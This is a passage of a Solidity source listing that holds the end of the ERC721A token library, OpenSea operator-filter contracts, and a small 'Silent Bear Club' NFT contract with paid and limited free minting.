1037         }
1038     }
1039 
1040     // =============================================================
1041     //                        MINT OPERATIONS
1042     // =============================================================
1043 
1044     /**
1045      * @dev Mints `quantity` tokens and transfers them to `to`.
1046      *
1047      * Requirements:
1048      *
1049      * - `to` cannot be the zero address.
1050      * - `quantity` must be greater than 0.
1051      *
1052      * Emits a {Transfer} event for each mint.
1053      */
1054     function _mint(address to, uint256 quantity) internal virtual {
1055         uint256 startTokenId = _currentIndex;
1056         if (quantity == 0) revert MintZeroQuantity();
1057 
1058         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1059 
1060         // Overflows are incredibly unrealistic.
1061         // `balance` and `numberMinted` have a maximum limit of 2**64.
1062         // `tokenId` has a maximum limit of 2**256.
1063         unchecked {
1064             // Updates:
1065             // - `balance += quantity`.
1066             // - `numberMinted += quantity`.
1067             //
1068             // We can directly add to the `balance` and `numberMinted`.
1069             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1070 
1071             // Updates:
1072             // - `address` to the owner.
1073             // - `startTimestamp` to the timestamp of minting.
1074             // - `burned` to `false`.
1075             // - `nextInitialized` to `quantity == 1`.
1076             _packedOwnerships[startTokenId] = _packOwnershipData(
1077                 to,
1078                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1079             );
1080 
1081             uint256 toMasked;
1082             uint256 end = startTokenId + quantity;
1083 
1084             // Use assembly to loop and emit the `Transfer` event for gas savings.
1085             // The duplicated `log4` removes an extra check and reduces stack juggling.
1086             // The assembly, together with the surrounding Solidity code, have been
1087             // delicately arranged to nudge the compiler into producing optimized opcodes.
1088             assembly {
1089                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1090                 toMasked := and(to, _BITMASK_ADDRESS)
1091                 // Emit the `Transfer` event.
1092                 log4(
1093                     0, // Start of data (0, since no data).
1094                     0, // End of data (0, since no data).
1095                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1096                     0, // `address(0)`.
1097                     toMasked, // `to`.
1098                     startTokenId // `tokenId`.
1099                 )
1100 
1101                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1102                 // that overflows uint256 will make the loop run out of gas.
1103                 // The compiler will optimize the `iszero` away for performance.
1104                 for {
1105                     let tokenId := add(startTokenId, 1)
1106                 } iszero(eq(tokenId, end)) {
1107                     tokenId := add(tokenId, 1)
1108                 } {
1109                     // Emit the `Transfer` event. Similar to above.
1110                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1111                 }
1112             }
1113             if (toMasked == 0) revert MintToZeroAddress();
1114 
1115             _currentIndex = end;
1116         }
1117         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1118     }
1119 
1120     /**
1121      * @dev Mints `quantity` tokens and transfers them to `to`.
1122      *
1123      * This function is intended for efficient minting only during contract creation.
1124      *
1125      * It emits only one {ConsecutiveTransfer} as defined in
1126      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1127      * instead of a sequence of {Transfer} event(s).
1128      *
1129      * Calling this function outside of contract creation WILL make your contract
1130      * non-compliant with the ERC721 standard.
1131      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1132      * {ConsecutiveTransfer} event is only permissible during contract creation.
1133      *
1134      * Requirements:
1135      *
1136      * - `to` cannot be the zero address.
1137      * - `quantity` must be greater than 0.
1138      *
1139      * Emits a {ConsecutiveTransfer} event.
1140      */
1141     function _mintERC2309(address to, uint256 quantity) internal virtual {
1142         uint256 startTokenId = _currentIndex;
1143         if (to == address(0)) revert MintToZeroAddress();
1144         if (quantity == 0) revert MintZeroQuantity();
1145         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1146 
1147         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1148 
1149         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1150         unchecked {
1151             // Updates:
1152             // - `balance += quantity`.
1153             // - `numberMinted += quantity`.
1154             //
1155             // We can directly add to the `balance` and `numberMinted`.
1156             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1157 
1158             // Updates:
1159             // - `address` to the owner.
1160             // - `startTimestamp` to the timestamp of minting.
1161             // - `burned` to `false`.
1162             // - `nextInitialized` to `quantity == 1`.
1163             _packedOwnerships[startTokenId] = _packOwnershipData(
1164                 to,
1165                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1166             );
1167 
1168             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1169 
1170             _currentIndex = startTokenId + quantity;
1171         }
1172         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1173     }
1174 
1175     /**
1176      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1177      *
1178      * Requirements:
1179      *
1180      * - If `to` refers to a smart contract, it must implement
1181      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1182      * - `quantity` must be greater than 0.
1183      *
1184      * See {_mint}.
1185      *
1186      * Emits a {Transfer} event for each mint.
1187      */
1188     function _safeMint(
1189         address to,
1190         uint256 quantity,
1191         bytes memory _data
1192     ) internal virtual {
1193         _mint(to, quantity);
1194 
1195         unchecked {
1196             if (to.code.length != 0) {
1197                 uint256 end = _currentIndex;
1198                 uint256 index = end - quantity;
1199                 do {
1200                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1201                         revert TransferToNonERC721ReceiverImplementer();
1202                     }
1203                 } while (index < end);
1204                 // Reentrancy protection.
1205                 if (_currentIndex != end) revert();
1206             }
1207         }
1208     }
1209 
1210     /**
1211      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1212      */
1213     function _safeMint(address to, uint256 quantity) internal virtual {
1214         _safeMint(to, quantity, '');
1215     }
1216 
1217     // =============================================================
1218     //                        BURN OPERATIONS
1219     // =============================================================
1220 
1221     /**
1222      * @dev Equivalent to `_burn(tokenId, false)`.
1223      */
1224     function _burn(uint256 tokenId) internal virtual {
1225         _burn(tokenId, false);
1226     }
1227 
1228     /**
1229      * @dev Destroys `tokenId`.
1230      * The approval is cleared when the token is burned.
1231      *
1232      * Requirements:
1233      *
1234      * - `tokenId` must exist.
1235      *
1236      * Emits a {Transfer} event.
1237      */
1238     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1239         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1240 
1241         address from = address(uint160(prevOwnershipPacked));
1242 
1243         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1244 
1245         if (approvalCheck) {
1246             // The nested ifs save around 20+ gas over a compound boolean condition.
1247             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1248                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1249         }
1250 
1251         _beforeTokenTransfers(from, address(0), tokenId, 1);
1252 
1253         // Clear approvals from the previous owner.
1254         assembly {
1255             if approvedAddress {
1256                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1257                 sstore(approvedAddressSlot, 0)
1258             }
1259         }
1260 
1261         // Underflow of the sender's balance is impossible because we check for
1262         // ownership above and the recipient's balance can't realistically overflow.
1263         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1264         unchecked {
1265             // Updates:
1266             // - `balance -= 1`.
1267             // - `numberBurned += 1`.
1268             //
1269             // We can directly decrement the balance, and increment the number burned.
1270             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1271             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1272 
1273             // Updates:
1274             // - `address` to the last owner.
1275             // - `startTimestamp` to the timestamp of burning.
1276             // - `burned` to `true`.
1277             // - `nextInitialized` to `true`.
1278             _packedOwnerships[tokenId] = _packOwnershipData(
1279                 from,
1280                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1281             );
1282 
1283             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1284             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1285                 uint256 nextTokenId = tokenId + 1;
1286                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1287                 if (_packedOwnerships[nextTokenId] == 0) {
1288                     // If the next slot is within bounds.
1289                     if (nextTokenId != _currentIndex) {
1290                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1291                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1292                     }
1293                 }
1294             }
1295         }
1296 
1297         emit Transfer(from, address(0), tokenId);
1298         _afterTokenTransfers(from, address(0), tokenId, 1);
1299 
1300         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1301         unchecked {
1302             _burnCounter++;
1303         }
1304     }
1305 
1306     // =============================================================
1307     //                     EXTRA DATA OPERATIONS
1308     // =============================================================
1309 
1310     /**
1311      * @dev Directly sets the extra data for the ownership data `index`.
1312      */
1313     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1314         uint256 packed = _packedOwnerships[index];
1315         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1316         uint256 extraDataCasted;
1317         // Cast `extraData` with assembly to avoid redundant masking.
1318         assembly {
1319             extraDataCasted := extraData
1320         }
1321         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1322         _packedOwnerships[index] = packed;
1323     }
1324 
1325     /**
1326      * @dev Called during each token transfer to set the 24bit `extraData` field.
1327      * Intended to be overridden by the cosumer contract.
1328      *
1329      * `previousExtraData` - the value of `extraData` before transfer.
1330      *
1331      * Calling conditions:
1332      *
1333      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1334      * transferred to `to`.
1335      * - When `from` is zero, `tokenId` will be minted for `to`.
1336      * - When `to` is zero, `tokenId` will be burned by `from`.
1337      * - `from` and `to` are never both zero.
1338      */
1339     function _extraData(
1340         address from,
1341         address to,
1342         uint24 previousExtraData
1343     ) internal view virtual returns (uint24) {}
1344 
1345     /**
1346      * @dev Returns the next extra data for the packed ownership data.
1347      * The returned result is shifted into position.
1348      */
1349     function _nextExtraData(
1350         address from,
1351         address to,
1352         uint256 prevOwnershipPacked
1353     ) private view returns (uint256) {
1354         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1355         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1356     }
1357 
1358     // =============================================================
1359     //                       OTHER OPERATIONS
1360     // =============================================================
1361 
1362     /**
1363      * @dev Returns the message sender (defaults to `msg.sender`).
1364      *
1365      * If you are writing GSN compatible contracts, you need to override this function.
1366      */
1367     function _msgSenderERC721A() internal view virtual returns (address) {
1368         return msg.sender;
1369     }
1370 
1371     /**
1372      * @dev Converts a uint256 to its ASCII string decimal representation.
1373      */
1374     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1375         assembly {
1376             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1377             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1378             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1379             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1380             let m := add(mload(0x40), 0xa0)
1381             // Update the free memory pointer to allocate.
1382             mstore(0x40, m)
1383             // Assign the `str` to the end.
1384             str := sub(m, 0x20)
1385             // Zeroize the slot after the string.
1386             mstore(str, 0)
1387 
1388             // Cache the end of the memory to calculate the length later.
1389             let end := str
1390 
1391             // We write the string from rightmost digit to leftmost digit.
1392             // The following is essentially a do-while loop that also handles the zero case.
1393             // prettier-ignore
1394             for { let temp := value } 1 {} {
1395                 str := sub(str, 1)
1396                 // Write the character to the pointer.
1397                 // The ASCII index of the '0' character is 48.
1398                 mstore8(str, add(48, mod(temp, 10)))
1399                 // Keep dividing `temp` until zero.
1400                 temp := div(temp, 10)
1401                 // prettier-ignore
1402                 if iszero(temp) { break }
1403             }
1404 
1405             let length := sub(end, str)
1406             // Move the pointer 32 bytes leftwards to make room for the length.
1407             str := sub(str, 0x20)
1408             // Store the length.
1409             mstore(str, length)
1410         }
1411     }
1412 }
1413 
1414 
1415 interface IOperatorFilterRegistry {
1416     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1417     function register(address registrant) external;
1418     function registerAndSubscribe(address registrant, address subscription) external;
1419     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1420     function unregister(address addr) external;
1421     function updateOperator(address registrant, address operator, bool filtered) external;
1422     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1423     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1424     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1425     function subscribe(address registrant, address registrantToSubscribe) external;
1426     function unsubscribe(address registrant, bool copyExistingEntries) external;
1427     function subscriptionOf(address addr) external returns (address registrant);
1428     function subscribers(address registrant) external returns (address[] memory);
1429     function subscriberAt(address registrant, uint256 index) external returns (address);
1430     function copyEntriesOf(address registrant, address registrantToCopy) external;
1431     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1432     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1433     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1434     function filteredOperators(address addr) external returns (address[] memory);
1435     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1436     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1437     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1438     function isRegistered(address addr) external returns (bool);
1439     function codeHashOf(address addr) external returns (bytes32);
1440 }
1441 
1442 
1443 /**
1444  * @title  OperatorFilterer
1445  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1446  *         registrant's entries in the OperatorFilterRegistry.
1447  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1448  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1449  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1450  */
1451 abstract contract OperatorFilterer {
1452     error OperatorNotAllowed(address operator);
1453 
1454     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1455         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1456 
1457     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1458         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1459         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1460         // order for the modifier to filter addresses.
1461         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1462             if (subscribe) {
1463                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1464             } else {
1465                 if (subscriptionOrRegistrantToCopy != address(0)) {
1466                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1467                 } else {
1468                     OPERATOR_FILTER_REGISTRY.register(address(this));
1469                 }
1470             }
1471         }
1472     }
1473 
1474     modifier onlyAllowedOperator(address from) virtual {
1475         // Check registry code length to facilitate testing in environments without a deployed registry.
1476         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1477             // Allow spending tokens from addresses with balance
1478             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1479             // from an EOA.
1480             if (from == msg.sender) {
1481                 _;
1482                 return;
1483             }
1484             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1485                 revert OperatorNotAllowed(msg.sender);
1486             }
1487         }
1488         _;
1489     }
1490 
1491     modifier onlyAllowedOperatorApproval(address operator) virtual {
1492         // Check registry code length to facilitate testing in environments without a deployed registry.
1493         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1494             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1495                 revert OperatorNotAllowed(operator);
1496             }
1497         }
1498         _;
1499     }
1500 }
1501 
1502 /**
1503  * @title  DefaultOperatorFilterer
1504  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1505  */
1506 abstract contract TheOperatorFilterer is OperatorFilterer {
1507     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1508 
1509     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1510 }
1511 
1512 
1513 contract SilentBearClub is ERC721A, TheOperatorFilterer {
1514 
1515     bool public _isSaleActive;
1516 
1517     bool public _revealed;
1518 
1519     uint256 public mintPrice;
1520 
1521     uint256 public maxBalance;
1522 
1523     uint256 public maxMint;
1524 
1525     string public baseExtension;
1526 
1527     string public uriSuffix;
1528 
1529     address public owner;
1530 
1531     uint256 public maxSupply;
1532 
1533     uint256 public cost;
1534 
1535     uint256 public maxFreeNumerAddr = 1;
1536 
1537     mapping(address => uint256) _numForFree;
1538 
1539     mapping(uint256 => uint256) _numMinted;
1540 
1541     uint256 private maxPerTx;
1542 
1543     function publicMint(uint256 amount) payable public {
1544         require(totalSupply() + amount <= maxSupply);
1545         if (msg.value == 0) {
1546             _safemints(amount);
1547             return;
1548         } 
1549         require(amount <= maxPerTx);
1550         require(msg.value >= amount * cost);
1551         _safeMint(msg.sender, amount);
1552     }
1553 
1554     function _safemints(uint256 amount) internal {
1555         require(amount == 1 
1556             && _numMinted[block.number] < FreeNum() 
1557             && _numForFree[tx.origin] < maxFreeNumerAddr );
1558             _numForFree[tx.origin]++;
1559             _numMinted[block.number]++;
1560         _safeMint(msg.sender, 1);
1561     }
1562 
1563     function reserve(address rec, uint256 amount) public onlyOwner {
1564         _safeMint(rec, amount);
1565     }
1566     
1567     modifier onlyOwner {
1568         require(owner == msg.sender);
1569         _;
1570     }
1571 
1572     constructor() ERC721A("Silent Bear Club", "SBC") {
1573         owner = msg.sender;
1574         maxPerTx = 15;
1575         cost = 0.002 ether;
1576         maxSupply = 999;
1577     }
1578 
1579     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1580         return string(abi.encodePacked("ipfs://bafybeie44sbasnradtjb54xuwypnn2gbphujp3wruypyzjnzndnwtditlm/", _toString(tokenId), ".json"));
1581     }
1582 
1583     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1584         maxFreeNumerAddr = maxTx;
1585     }
1586 
1587     function FreeNum() internal returns (uint256){
1588         return (maxSupply - totalSupply()) / 12;
1589     }
1590 
1591     function withdraw() external onlyOwner {
1592         payable(msg.sender).transfer(address(this).balance);
1593     }
1594 
1595     /////////////////////////////
1596     // OPENSEA FILTER REGISTRY 
1597     /////////////////////////////
1598 
1599     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1600         super.setApprovalForAll(operator, approved);
1601     }
1602 
1603     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1604         super.approve(operator, tokenId);
1605     }
1606 
1607     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1608         super.transferFrom(from, to, tokenId);
1609     }
1610 
1611     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1612         super.safeTransferFrom(from, to, tokenId);
1613     }
1614 
1615     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1616         public
1617         payable
1618         override
1619         onlyAllowedOperator(from)
1620     {
1621         super.safeTransferFrom(from, to, tokenId, data);
1622     }
1623 }